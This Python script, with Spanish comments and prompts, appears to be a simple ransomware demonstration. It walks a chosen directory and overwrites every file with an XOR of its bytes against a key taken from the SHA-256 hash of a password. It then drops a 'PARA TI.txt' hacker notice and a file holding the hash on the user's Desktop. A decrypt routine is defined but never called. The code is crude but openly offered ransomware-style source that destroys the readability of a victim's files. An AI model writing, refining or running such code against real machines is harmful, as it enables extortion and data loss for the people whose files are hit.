import hashlib
import os
import shutil
from pathlib import Path

HACKER_FILE_NAME = "PARA TI.txt"
HASH_FILE_NAME = "HASH.txt"


def hash_password(password):
    # Genera un hash a partir de la contraseña
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    return password_hash


def encrypt_directory(directory, password):
    # Cifra el directorio usando el hash de la contraseña
    password_hash = hash_password(password)
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
                encrypted_data = bytearray(x ^ ord(password_hash[i % len(password_hash)].encode()) for i, x in enumerate(data))
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
    return password_hash


def get_user_path():
    # Obtiene la ruta de usuario
    return "{}/".format(Path.home())


def create_hacker_file(user_path, directory):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Acabo de encriptar los archivos de la ruta {}\n\n".format(directory))
    return hacker_file


def create_hash_file(user_path, password_hash):
    hash_file = open(user_path + "Desktop/" + HASH_FILE_NAME, "w")
    hash_file.write("El hash es: {}\n\n".format(password_hash))
    return hash_file


def decrypt_directory(directory, password2):
    # Descifra el directorio usando el hash de la contraseña
    password_hash = hash_password(password2)
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
                decrypted_data = bytearray(x ^ ord(password_hash[i % len(password_hash)].encode()) for i, x in enumerate(data))
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)


def encriptar():
    user_path = get_user_path()
    password = input("Ingrese la contraseña: ")
    directory = input("Ingrese la ruta del directorio a encriptar: ")
    password_hash = encrypt_directory(directory, password)
    create_hacker_file(user_path, directory)
    create_hash_file(user_path, password_hash)
    hash1 = password_hash
    print("El directorio se ha creado con exito ")
    return hash1


def main():
    while True:
        pregunta = input("Desea encriptar [S/N]: ")

        if pregunta == "S":
            encriptar()
            print("Se ha encriptado con exito")
            exit()

        if pregunta == "N":
            exit()
        else:
            print("Vuelve a intentarlo...")


if __name__ == '__main__':
    main()
